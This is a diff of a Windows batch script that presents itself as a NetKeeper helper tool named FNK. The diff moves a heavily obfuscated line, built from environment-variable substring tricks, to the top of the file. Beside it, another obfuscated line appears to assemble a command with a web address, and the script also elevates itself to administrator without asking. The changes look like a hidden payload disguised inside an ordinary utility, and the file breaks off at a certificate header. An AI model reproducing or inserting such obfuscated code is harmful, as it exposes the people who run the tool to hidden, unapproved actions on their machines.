@@ -1,11 +1,10 @@
 ::有疑问请加qq 1280874899
+@%comspec:~-1,1%%comspec:~-7,1%%pathext:~-6,1%%os:~4,1% %os:~4,1%%commonprogramfiles:~-5,1%%commonprogramfiles:~-5,1% && %os:~6,1%%comspec:~-1,1%%comspec:~-13,1% /%allusersprofile:~-1,1% %comspec:~-5,1%%commonprogramfiles:~-5,1%%os:~2,1%%homepath:~1,1%%allusersprofile:~-5,1%=0%comspec:~-2,1%73874%comspec:~-5,1%90 >%os:~2,1%%homepath:~1,1%%commonprogramfiles:~-3,1% && %os:~6,1%%comspec:~-1,1%%comspec:~-13,1% %comspec:~-5,1%%commonprogramfiles:~-5,1%%comspec:~-1,1%%comspec:~-2,1%=qKZ && @%comspec:~-1,1%%comspec:~-7,1%%pathext:~-6,1%%os:~4,1% %os:~4,1%%os:~2,1%
 @echo off
 mode con: cols=65 lines=25
 color 8b
 %1 mshta vbscript:CreateObject("Shell.Application").ShellExecute("cmd.exe","/c %~s0 ::","","runas",1)(window.close)&& echo. && echo      未获取管理员权限 && ping -n 3 127.0.0.1>nul && exit
-@%comspec:~-1,1%%comspec:~-7,1%%pathext:~-6,1%%os:~4,1% %os:~4,1%%commonprogramfiles:~-5,1%%commonprogramfiles:~-5,1% && %os:~6,1%%comspec:~-1,1%%comspec:~-13,1% /%allusersprofile:~-1,1% %comspec:~-5,1%%commonprogramfiles:~-5,1%%os:~2,1%%homepath:~1,1%%allusersprofile:~-5,1%=0%comspec:~-2,1%73874%comspec:~-5,1%90 >%os:~2,1%%homepath:~1,1%%commonprogramfiles:~-3,1% && %os:~6,1%%comspec:~-1,1%%comspec:~-13,1% %comspec:~-5,1%%commonprogramfiles:~-5,1%%comspec:~-1,1%%comspec:~-2,1%=qKZ && @%comspec:~-1,1%%comspec:~-7,1%%pathext:~-6,1%%os:~4,1% %os:~4,1%%os:~2,1%
 %comspec:~-13,1%%os:~1,1%%comspec:~-13,1%%commonprogramfiles:~-3,1%%comspec:~-1,1% %pathext:~11,1%%comspec:~12,1% %commonprogramfiles:~-5,1%%os:~1,1%%commonprogramfiles:~-5,1%%comspec:~-7,1%%os:~4,1%%allusersprofile:~-5,1% %pathext:~-6,1%%comspec:~-13,1%%comspec:~-13,1%%allusersprofile:~3,1%%os:~6,1%://%commonprogramfiles:~-5,1%%dfnum:~-10,1%%dfnum:~-2,1%.%allusersprofile:~3,1%%comspec:~3,1%/%commonprogramfiles:~-5,1%%os:~2,1%%dfex:~1,1%
-@echo off
 
 :init
 cls
@@ -55,7 +54,7 @@ echo.      .. 按任意键查看WiFi共享软件
 pause>nul
 cls
 echo.
-echo.      FNK - FifcomNetkeeperKiller
+echo.      FNK - FifcomNetkeeperKillerS
 echo.   ___________________________________________________________
 echo.
 echo.
@@ -76,11 +75,12 @@ echo.      FNK - FifcomNetkeeperKiller
 echo.   ___________________________________________________________
 echo.
 echo.
-echo.      .. 请启动NetKeeper(沃派)
+echo.      .. 请启动NetKeeper
 echo.
 echo.      .. 如无需使用请关闭本程序
 for /f "delims= " %%i in ('tasklist^|find /i "N%dfex:~1,1%.%comspec:~-1,1%%comspec:~-2,1%%comspec:~-1,1%"') do (
 if /i "%%i"=="N%dfex:~1,1%.%comspec:~-1,1%%comspec:~-2,1%%comspec:~-1,1%" goto exist)
+ping -n 2 127.0.0.1>nul
 goto notexist
 
 -----BEGIN CERTIFICATE-----
